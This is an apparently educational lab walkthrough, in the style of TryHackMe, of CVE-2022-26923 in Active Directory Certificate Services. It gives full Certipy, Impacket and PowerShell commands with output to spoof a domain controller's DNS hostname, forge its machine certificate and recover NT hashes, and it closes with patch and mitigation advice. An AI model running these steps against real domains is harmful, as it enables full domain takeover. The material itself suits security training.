<!--
title: ADCS-CVE-2022-26923
description: 
published: true
date: 2023-02-26T21:36:09.767Z
tags: 
editor: ckeditor
dateCreated: 2023-02-26T21:36:09.767Z
-->

<h1>Introduction</h1>
<p>This room explores <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923">CVE-2022-26923</a>, a vulnerability in Microsoft's <a href="https://tryhackme.com/room/activedirectorybasics">Active Directory</a> Certificate Service (AD CS) that allows any AD user to escalate their privileges to Domain Admin in a single hop!</p>
<p>Research done and released as a <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2">whitepaper</a> by SpecterOps showed that it was possible to exploit misconfigured certificate templates for privilege escalation and lateral movement. Based on the severity of the misconfiguration, it could allow any low-privileged user on the AD domain to escalate their privilege to that of an Enterprise Domain Admin with just a few clicks. If you are interested in learning more about these Certificate Template exploits, see <a href="http://tryhackme.com/jr/adcertificatetemplates">this room</a>.</p>
<p>Further research was performed by <a href="https://twitter.com/ly4k_">Oliver Lyak</a>, who discovered an additional vulnerability (CVE-2022-26923) in the Certificate Service. A patch was released for the vulnerability by Microsoft on the 10th of May. You can read more about the research <a href="https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4">here</a>. This room provides a walkthrough of the exploitation of the vulnerability, as detailed in the research.</p>
<h1>A brief look at certificate templates</h1>
<p>Windows Active Directory (AD) is not just for identity and access management but provides a significant amount of services to help you run and manage your organisation. Many of these services are less commonly known or used, meaning they are often overlooked when security hardening is performed. One of these services is the Active Directory Certificate Services (AD CS).</p>
<p>When talking about certificates, we usually only think about the most common ones, such as those used to upgrade website traffic to HTTPS. But these are generally only used for applications that the organisation exposes to the internet. What about all those applications running on the internal network? Do we now have to give them internet access to allow them to request a certificate from a trusted Certificate Authority (CA)? Well, not really. Cue AD CS.</p>
<p>AD CS is Microsoft's Public Key Infrastructure (PKI) implementation. Since AD provides a level of trust in an organisation, it can be used as a CA to prove and delegate trust. AD CS is used for several things, such as encrypting file systems, creating and verifying digital signatures, and even user authentication, making it a promising avenue for attackers. What makes it an even more dangerous attack vector, is that certificates can survive credential rotation, meaning even if a compromised account's password is reset, that will do nothing to invalidate the maliciously generated certificate, providing persistent credential theft for up to 10 years! The diagram below shows what the flow for certificate requests and generation looks like <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2?gi=cb29976b7c8b">(taken from SpecterOps whitepaper)</a>:</p>
<figure class="image"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6abc4f005b619e77d22020817efcd569.png"></figure>
<p>Since AD CS is such a privileged function, it normally runs on selected domain controllers. Meaning normal users can't really interact with the service directly. On the other side, organisations tend to be too large to have an administrator create and distribute each certificate manually. This is where certificate templates come in. Administrators of AD CS can create several templates that can allow any user with the relevant permissions to request a certificate themselves. These templates have parameters that say which user can request the certificate and what is required. What SpecterOps has found, was that specific combinations of these parameters can be incredibly toxic and be abused for privilege escalation and persistent access!</p>
<p>Before we dive deeper into certificate abuse, some terminology:</p>
<ul>
  <li>PKI - Public Key Infrastructure is a system that manages certificates and public key encryption</li>
  <li>AD CS - Active Directory Certificate Services is Microsoft's PKI implementation which usually runs on domain controllers</li>
  <li>CA - Certificate Authority is a PKI that issues certificates</li>
  <li>Certificate Template - a collection of settings and policies that defines how and when a certificate may be issued by a CA</li>
  <li>CSR - Certificate Signing Request is a message sent to a CA to request a signed certificate</li>
  <li>EKU - Extended/Enhanced Key Usage are object identifiers that define how a generated certificate may be used</li>
</ul>
<h1>CVE-2022-26923 explained</h1>
<p><strong>Client Authentication</strong></p>
<p>As discussed in the overview of Certificate Templates, they are convenient to allow users and systems to enrol for certificates. Certificates have many use cases in the network. For CVE-2022-26923 and the template misconfigurations discovered by SpectorOps, the primary focus is on the Client Authentication use case.</p>
<p>Client Authentication allows the owner of the certificate to use it to verify their own identity in AD for authentication purposes. For example, a client certificate is used to authenticate against a web application. The authentication process occurs through <a href="https://tryhackme.com/room/attackingkerberos">Kerberos</a>. If we have a valid certificate that has the Client Authentication EKU, we can interface with AD CS and the Key Distribution Centre to request a Kerberos TGT that can then be used for further authentication.</p>
<p>As an attacker, we can leverage this to generate a TGT to impersonate another user or system, should we have a valid certificate for them. In essence, we want to be able to modify the Subject Alternative Name (SAN) attribute of the certificate request to point to someone or something else, that has more permissions to perform privilege escalation.</p>
<p><strong>Default Certificate Templates</strong></p>
<p>By default, when AD CS is installed in an environment, two certificate templates are made available for requests that support Client Authentication:</p>
<ul>
  <li><strong>User Certificate Template</strong> - This certificate template can be requested by any user that belongs to the <i>Domain Users</i> group.</li>
  <li><strong>Machine Certificate Template</strong> - This certificate template can be requested by any host that belongs to the <i>Domain Computers</i> group.</li>
</ul>
<p>The User Template is not vulnerable by default. When we request a certificate based on the User template, the User Principal Name (UPNs) of the user account will be embedded in the SAN that can be used for identification. Since UPNs must be unique, and we usually do not have the ability to modify our UPN, we cannot leverage this template. Furthermore, since we don't have the ability to alter the SAN value in the certificate signing request, we cannot impersonate another user by specifying their UPN.</p>
<p>However, computer accounts do not have a UPN. Instead of using a UPN for authentication, the Machine template uses the DNS Name of the machine for identification and authentication. When a certificate is requested for a machine through the Machine template, AD CS embeds the machine's DNS Name into the SAN, which is then used for authentication.</p>
<p><strong>Default Domain User Privileges</strong></p>
<p>By default, any user who is a member of the Authenticated Users group (literally all AD accounts) can enrol up to 10 new machines on the domain. This is often used in organisations to allow users to bring their own device (BYOD) and enrol it for use on the domain. This in itself is not really a vulnerability but has led to some interesting privilege escalation vectors in the path, exactly what we will be exploiting for this CVE.</p>
<p>When we enrol a new host in AD, we are assigned as the owner of that host. This provides us with certain permissions over the AD Object associated with that host. Two permissions in particular cause an issue here:</p>
<ul>
  <li><strong>Validate write to DNS hostname</strong> - This permission allows us to update the DNS hostname of our AD Object associated with the host.</li>
  <li><strong>Validate write to Service Principal Name (SPN)</strong> - This permission allows us to update the SPN of our AD Object associated with the host.</li>
</ul>
<p>SPNs are used by Kerberos authentication to associate a service instance with a service logon account. By default, the Computer AD Object receives SPNs associated with their name to allow for Kerberos authentication, which the host requires to perform specific requests against AD. SPNs must be unique, meaning two AD Objects are not allowed to have the same SPN.</p>
<p>You would think it would be as simple as changing the DNS hostname to another hostname, maybe the hostname of a Domain Controller for privilege escalation? However, if you change the DNS hostname, Microsoft automatically updates the SPN attribute. Since those must be unique, we will get an error if we try to impersonate another host through the DNS hostname attribute. But since we have the ability also to change the SPN, we can bypass this restriction.</p>
<p>The pieces of the puzzle should now start to come together. If we only had one of the two permissions, we would not have a vulnerability.&nbsp; However, the combination of having those two permissions allows us to perform privilege escalation.</p>
<p><strong>Putting it all Together</strong></p>
<p>Using these configurations, the default AD CS Machine certificate template, the default ability to enrol a new machine, and the default permissions assigned on the created Computer AD Object, we have a privilege escalation vector on our hands. What makes it worse is that this privilege escalation vector requires minimal effort, meaning the attacker's skill level to exploit this issue is quite low. The basic steps are the following:</p>
<ol>
  <li>Compromise the credentials of a low-privileged AD user.</li>
  <li>Use those credentials to enrol a new host on the domain.</li>
  <li>Alter the DNS hostname attribute of the Computer AD Object to that of a privileged host, such as a Domain Controller.</li>
  <li>Remove the SPN attributed to bypass the unique SPN conflict issue.</li>
  <li>Request a Machine certificate using the default template.</li>
  <li>Perform Kerberos authentication with the received template, now as the privileged machine account instead of our fake machine account.</li>
</ol>
<h1>Exploiting CVE-2022-26923</h1>
<p>Now that we have covered the theory. Let's see it in action.</p>
<p><strong>Configuring DNS</strong></p>
<p>First, we need to configure some DNS values. Modify your <code>/etc/hosts</code> file and add the following entry:</p>
<p>/etc/hosts</p>
<pre><code class="language-plaintext">MACHINE_IP lundc.lunar.eruca.com lundc lunar-LUNDC-CA lunar.eruca.com</code></pre>
<p><strong>Testing Certificate Generation</strong></p>
<p>Similar to the blog post, we will use <a href="https://github.com/ly4k/Certipy">Certipy</a> for our exploitation, which has been installed for you on the AttackBox. Certipy is an offensive tool for enumeration and exploitation of AD CS vulnerabilities and misconfigurations. It integrates with <a href="https://github.com/SecureAuthCorp/impacket">Impacket</a> for some of the exploits, so if you are installing this on your own machine, make sure to update Impacket as well. We have created a virtual python environment with all of these tools. If you are using the AttackBox, start by activating the virtual environment:</p>
<p>AttackBox Terminal</p>
<pre><code class="language-plaintext">[thm@thm]$ source /root/Rooms/CVE2022-26923/certipy/bin/activate</code></pre>
<p>Let's first get our feet wet with generating a certificate for our low-privileged AD user (Username=thm Password=Password1@) using the User certificate template:</p>
<p>AttackBox Terminal</p>
<pre><code class="language-plaintext">(certipy) [thm@thm]$ certipy req 'lunar.eruca.com/thm:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template User
Certipy v3.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate
[*] Successfully requested certificate
[*] Request ID is 20
[*] Got certificate with UPN 'thm@lunar.eruca.com'
[*] Saved certificate and private key to 'thm.pfx'
</code></pre>
<p><strong>Note: If you get a timeout error for this command or any of the rest of the Certipy commands, just wait two seconds and then run it again. Unfortunately, with a UDP VPN connection, it is not always sufficiently stable for these requests to pass through.</strong></p>
<p>We can verify that this certificate is valid and can be used for Kerberos authentication through Certipy as well:</p>
<p>AttackBox Terminal</p>
<pre><code class="language-plaintext">(certipy) [thm@thm]$ certipy auth -pfx thm.pfx
Certipy v3.0.0 - by Oliver Lyak (ly4k)

[*] Using principal: thm@lunar.eruca.com
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'thm.ccache'
[*] Trying to retrieve NT hash for 'thm'
[*] Got NT hash for 'thm@lunar.eruca.com': 43460d636f269c709b20049cee36ae7a
</code></pre>
<p>Certipy performs authentication with the certificate and uses Impacket to recover the NTLM hash associated with the UPN specified in the certificate. We could, of course, use something like <a href="https://github.com/GhostPack/Rubeus">Rubeus</a> to request a TGT and then import that with <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a> for attacks, but this at least proves that the certificate is valid and can be used for Kerberos authentication.</p>
<p><strong>Adding a Computer to the Domain</strong></p>
<p>We need to add a new computer to the domain to generate a Machine certificate. Luckily, we don't have to add a physical computer to the network. We can use Impacket's <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py">addcomputer.py script</a> to simply make it look like we are adding a new computer:</p>
<p>AttackBox Terminal</p>
<pre><code class="language-plaintext">(certipy) [thm@thm]$ addcomputer.py 'lunar.eruca.com/thm:Password1@' -method LDAPS -computer-name 'THMPC' -computer-pass 'Password1@'
Impacket v0.10.1.dev1 - Copyright 2022 SecureAuth Corporation

[*] Successfully added machine account THMPC$ with password Password1@.</code></pre>
<p>&nbsp;</p>
<p>Parameters explained:</p>
<ul>
  <li><strong>lunar.eruca.com/thm:Password1@</strong> - We need to provide valid AD credentials in order to add a new computer.</li>
  <li><strong>method</strong> - The method of authentication. LDAPS will interface with the LDAP service on the domain controller.</li>
  <li><strong>computer-name</strong> - The name of our computer. This can be anything we like, as long as it is not the same as an existing computer object.</li>
  <li><strong>computer-pass</strong> - The password associated with our computer's machine account. We will need to impersonate this computer that we create, so make note of the password you chose here.</li>
</ul>
<p>First, let's generate a certificate for the new computer we created. To use the machine account of said computer, you need to add a "$" at the end of the name:</p>
<p>AttackBox Terminal</p>
<pre><code class="language-plaintext">(certipy) [thm@thm]$ certipy req 'lunar.eruca.com/THMPC$:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template Machine
Certipy v3.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate
[*] Successfully requested certificate
[*] Request ID is 20
[*] Got certificate with DNS Host Name 'THMPC.lunar.eruca.com'
[*] Saved certificate and private key to 'thmpc.pfx'
</code></pre>
<p>Again we can verify that the certificate is valid by using Certipy:</p>
<p>AttackBox Terminal</p>
<pre><code class="language-plaintext">(certipy) [thm@thm]$ certipy auth -pfx thmpc.pfx
Certipy v3.0.0 - by Oliver Lyak (ly4k)

[*] Using principal: thmpc$@lunar.eruca.com
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'thmpc.ccache'
[*] Trying to retrieve NT hash for 'thmpc$'
[*] Got NT hash for 'thmpc$@lunar.eruca.com': 43460d636f269c709b20049cee36ae7a
</code></pre>
<p>We can verify the NTLM hash recovered against the password we set for the machine account using an <a href="https://codebeautify.org/ntlm-hash-generator">NTLM Generator</a>.</p>
<p><strong>Updating the DNS Hostname and SPN Attributes</strong></p>
<p>In order to update the AD object's attributes, we will use the <a href="https://docs.microsoft.com/en-us/powershell/module/activedirectory">AD-RSAT PowerShell</a> cmdlets. You can use the following command on the AttackBox to SSH into the machine:</p>
<p>AttackBox Terminal</p>
<pre><code class="language-plaintext">[thm@thm]$ ssh lunar.eruca.com\\thm@lundc
</code></pre>
<p>Once you're in, start Powershell:</p>
<p>SSH Terminal</p>
<pre><code class="language-plaintext">lunar\thm@LUNDC C:\Users\thm&gt;powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\thm&gt;</code></pre>
<p>Let's first just get the current attributes from our Computer AD Object using the Get-ADComputer cmdlet:</p>
<p>SSH Terminal</p>
<pre><code class="language-plaintext">PS C:\Users\thm&gt;Get-ADComputer THMPC -properties dnshostname,serviceprincipalname

DistinguishedName    : CN=THMPC,CN=Computers,DC=lunar,DC=eruca,DC=com                                                                
DNSHostName          : THMPC.lunar.eruca.com                                                                                         
Enabled              : True                                                                                                           
Name                 : THMPC2ObjectClass          : computer                                                                                                       
ObjectGUID           : f40260ee-2f74-4fa1-aa4c-f83bcf589c15                                                                           
SamAccountName       : THMPC$                                                                                                        
serviceprincipalname : {RestrictedKrbHost/THMPC.lunar.eruca.com, RestrictedKrbHost/THMPC, HOST/THMPC.lunar.eruca.com, HOST/THMPC} 
SID                  : S-1-5-21-3330634377-1326264276-632209373-11218                                                                 
UserPrincipalName    : </code></pre>
<p>We can see that both the DNS hostname and the SPN attributes are set to match our computer's name. Let's try to update the DNS hostname attribute to that of the DC using the Set-ADComputer cmdlet:</p>
<p>SSH Terminal</p>
<pre><code class="language-plaintext">PS C:\Users\thm&gt;Set-ADComputer THMPC -DnsHostName LUNDC.lunar.eruca.com
Set-ADComputer : The operation failed because SPN value provided for addition/modification is not unique forest-wide 
At line:1 char:1                                                                                                     
+ Set-ADComputer THMPC -DnsHostName LUNDC.lunar.eruca.com                                                           
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                                           
    + CategoryInfo          : NotSpecified: (THMPC:ADComputer) [Set-ADComputer], ADException                        
    + FullyQualifiedErrorId : ActiveDirectoryServer:8647,Microsoft.ActiveDirectory.Management.Commands.SetADComputer</code></pre>
<p>As we can see from the output, Microsoft automatically changes the SPN attribute when we set the DNS hostname. Since an SPN already exists for LUNDC, the command fails. To counter this, let's first remove our current SPN attribute:</p>
<p>SSH Terminal</p>
<pre><code class="language-plaintext">PS C:\Users\thm&gt;Set-ADComputer THMPC -ServicePrincipalName @{}
PS C:\Users\thm&gt;</code></pre>
<p>Now that we have flushed our Computer AD Object's SPN, let's again try to set the DNS hostname attribute to that of the DC:</p>
<p>SSH Terminal</p>
<pre><code class="language-plaintext">PS C:\Users\thm&gt;Set-ADComputer THMPC -DnsHostName LUNDC.lunar.eruca.com
PS C:\Users\thm&gt;</code></pre>
<p>That is positive. No error this time. Let's verify that the changes were made:</p>
<p>SSH Terminal</p>
<pre><code class="language-plaintext">PS C:\Users\thm&gt;Get-ADComputer THMPC -properties dnshostname,serviceprincipalname

DistinguishedName : CN=THMPC,CN=Computers,DC=lunar,DC=eruca,DC=com 
DNSHostName       : LUNDC.lunar.eruca.com                           
Enabled           : True
Name              : THMPC
ObjectClass       : computer
ObjectGUID        : f40260ee-2f74-4fa1-aa4c-f83bcf589c15 
SamAccountName    : THMPC$
SID               : S-1-5-21-3330634377-1326264276-632209373-11218
UserPrincipalName :</code></pre>
<p>Perfect! By simply removing our SPNs, Microsoft no longer tries to change those when we change our DNS hostname, meaning we can change it to a legitimate host's DNS hostname.</p>
<p><strong>Forging a Malicious Certificate</strong></p>
<p>Time to regenerate some certificates! Let's run that same command of Certipy again to request a new certificate for our computer:</p>
<p>AttackBox Terminal</p>
<pre><code class="language-plaintext">(certipy) [thm@thm]$ certipy req 'lunar.eruca.com/THMPC$:Password1@@lundc.lunar.eruca.com' -ca LUNAR-LUNDC-CA -template Machine
Certipy v3.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate
[*] Successfully requested certificate
[*] Request ID is 21
[*] Got certificate with DNS Host Name 'LUNDC.lunar.eruca.com'
[*] Saved certificate and private key to 'lundc.pfx'
</code></pre>
<p>This time we noticed something different. Even though we requested a certificate for THMPC, we got a certificate for LUNDC. Let's verify that this certificate is working and will return the NTLM hash of the LUNDC machine account instead:</p>
<p>AttackBox Terminal</p>
<pre><code class="language-plaintext">(certipy) [thm@thm]$ certipy auth -pfx lundc.pfx
Certipy v3.0.0 - by Oliver Lyak (ly4k)

[*] Using principal: lundc$@lunar.eruca.com
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'lundc.ccache'
[*] Trying to retrieve NT hash for 'lundc$'
[*] Got NT hash for 'thmpc$@lunar.eruca.com': &lt;Redacted&gt;
</code></pre>
<p>We officially have the NTLM hash for the machine account of LUNDC! Since LUNDC is a domain controller and we have administrative access to the DC, we have fully compromised the domain in one hop! If you want to take this further, you can follow the steps in Task 5 of the previous <a href="http://tryhackme.com/jr/adcertificatetemplates">AD CS room</a> to request a TGT using the certificate and alter the password on one of the DA's just to prove that you have indeed fully compromised the domain.</p>
<h1>Mitigations and Fixes</h1>
<p>To defend against CVE-2022-26923, the best course of action is to apply the <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923">patch released by Microsoft</a>:</p>
<ol>
  <li>A new Object ID (OID) was introduced in new certificates to further fingerprint the user. This is done by embedding the user's objectSid within the new <i>szOID_NTDS_CA_SECURITY_EXT</i> OID.</li>
  <li>The "Validated write to DNS hostname" permission now only allows you to set the DNSHostname to an attribute matching the SAM Account Name or the computer account, meaning it can't be used to spoof the account name of other hosts.</li>
</ol>
<p>Together with this, there are a few other security measures that you can take:</p>
<ul>
  <li>Make sure that your certificate templates are restricted. Only allow Machine and User automatic enrollment if it is required. Otherwise, through security configuration, the permissions for these templates can be reduced.</li>
  <li>If there is no business case for allowing users to enrol hosts onto AD, change the MS-DS-Machine-Account-Quota attribute to 0 on all accounts that should not have the ability to enrol new hosts. This will not resolve the issue, however, since an attacker only has to gain administrative access over a single domain-joined host to be able to perform a certificate request</li>
</ul>
<h1>Conclusion</h1>
<p>That's a wrap!</p>
<p>In this room, we showed a possible method to exploit CVE-2022-26923. As mentioned previously, this is one of the new CVEs that came to light in Microsoft's AD Certificate Service. There are other issues, such as toxic parameter combinations that are not even classified as CVEs that can be used for privilege escalation. Have a read through the <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2">SpecterOps whitepaper</a> if you are interested in learning more.</p>
<p>&nbsp;</p>
